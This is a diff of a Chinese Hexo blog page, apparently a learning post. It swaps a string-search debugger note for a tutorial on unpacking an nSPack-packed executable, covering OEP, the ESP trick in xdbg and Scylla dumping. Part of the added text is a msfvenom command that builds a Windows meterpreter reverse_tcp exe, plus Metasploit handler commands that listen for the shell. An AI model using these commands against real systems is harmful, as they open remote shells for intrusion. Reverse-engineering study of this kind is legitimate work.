@@ -22,7 +22,7 @@
 
   
 
-  <title>字符串搜索 | Hexo</title>
+  <title>脱壳 | Hexo</title>
 
   
 
@@ -93,17 +93,12 @@
     <div class="header-content">
       <div class="post-text layout-block">
         <div class="layout-margin">
-          <h1 class="title-wrap">字符串搜索</h1>
+          <h1 class="title-wrap">脱壳</h1>
           <h2 class="title-sub-wrap">
             <strong>John Doe</strong>
             <span>发布于</span>
-            <time  class="article-date" datetime="2024-10-15T03:13:19.000Z" itemprop="datePublished">2024-10-15</time>
+            <time  class="article-date" datetime="2024-10-21T03:13:19.000Z" itemprop="datePublished">2024-10-21</time>
           </h2>
-          
-            <h2 class="last-time">
-              <span>最后更新于</span>
-              <time  class="article-updated" datetime="2024-10-16T06:30:13.088Z" itemprop="dateUpdated">2024-10-16</time>
-            </h2>
           
           
           <ul class="wrap-list dark">
@@ -137,17 +132,33 @@
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
         <h3 id=""><a href="#" class="headerlink" title=""></a></h3><span id="more"></span>
 
+<p>OEP(Original Entry Point)-原始入口点</p>
+<ul>
+<li><p>OEP通常用于描述一个可执行文件在没有被壳（加壳软件或者加密软件）保护的情况下，代码的正常执行起点。</p>
+</li>
+<li><p>当一个软件被加壳保护之后，其执行起点会被改为壳的代码段，真正的程序代码（也就是我们说的OEP）会被加密或者压缩存放在其他位置，只有在适当的时机下才会被解密和加载出来执行。</p>
+</li>
+<li><p>OEP就是反向工程师在分析加壳软件的时候，需要找到的一个非常重要的位置，只有脱掉壳，找到OEP，才能进一步分析和理解程序原始的执行逻辑与功能。</p>
+</li>
+</ul>
+<p>msf生成exe文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">生成32位：</span><br><span class="line"></span><br><span class="line">sudo msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe LHOST=ip LPORT=端口 &gt; reverse_32bit.exe</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
+<p>监听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport xxxx</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 
-<p><strong>工具配置</strong></p>
-<p>1.确保程序入口点</p>
-<p><img src="/2024/07/15/IPv4%E5%8A%A0%E5%AF%86/01.jpg" alt="1"></p>
-<p>2.把程序拖入dbg中，运行程序</p>
-<p><img src="/2024/07/15/IPv4%E5%8A%A0%E5%AF%86/02.jpg" alt="1"></p>
-<p><img src="/2024/07/15/IPv4%E5%8A%A0%E5%AF%86/05.jpg" alt="1"></p>
-<p>3.右键搜索-&gt;当前模块-&gt;字符串</p>
-<p><img src="/2024/07/15/IPv4%E5%8A%A0%E5%AF%86/03.jpg" alt="1"></p>
-<p><img src="/2024/07/15/IPv4%E5%8A%A0%E5%AF%86/04.jpg" alt="1"></p>
+<p>首先使用peid进行查壳，发现存在nSPack壳</p>
+<p><img src="/2024/07/15/IPv4%E5%8A%A0%E5%AF%86/494833795.jpg" alt="1"></p>
+<p>拖入xdbg，先单步运行到pushad，发现esp产生了变动</p>
+<p><img src="/2024/07/15/IPv4%E5%8A%A0%E5%AF%86/495055663.jpg" alt="1"></p>
+<p>查看内存，对里面的数据打一个断点，然后运行</p>
+<p><img src="/2024/07/15/IPv4%E5%8A%A0%E5%AF%86/495135877.jpg" alt="1"></p>
+<p>运行之后esp又发生了变化，进行单步运行到达OEP</p>
+<p><img src="/2024/07/15/IPv4%E5%8A%A0%E5%AF%86/495360368.jpg" alt="1"></p>
+<p>使用插件scylla进行脱壳</p>
+<p><img src="/2024/07/15/IPv4%E5%8A%A0%E5%AF%86/495493378.jpg" alt="1"></p>
+<p>双击正常运行</p>
+<p><img src="/2024/07/15/IPv4%E5%8A%A0%E5%AF%86/495561648.jpg" alt="1"></p>
 
       </section>
 
@@ -155,28 +166,14 @@
       
         <nav class="article-nav">
           
-            <div class="article-nav-item layout-padding">
-  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
-    
-    <div class="card-text">
-      
-        <a href="/2024/10/15/%E6%9E%9A%E4%B8%BE%E8%BF%9B%E7%A8%8B/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">枚举进程</h2>
-        </a>
-      
-      <div class="card-text--row">Newer</div>
-    </div>
-  </article>
-</div>
-          
           
             <div class="article-nav-item layout-padding">
   <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
     
     <div class="card-text">
       
-        <a href="/2024/10/14/Windows%20Shellcode%E5%AD%A6%E4%B9%A0/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">Windows Shellcode学习</h2>
+        <a href="/2024/10/20/%E5%B8%B8%E8%A7%81winapi/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">常见winapi</h2>
         </a>
       
       <div class="card-text--row">Older</div>
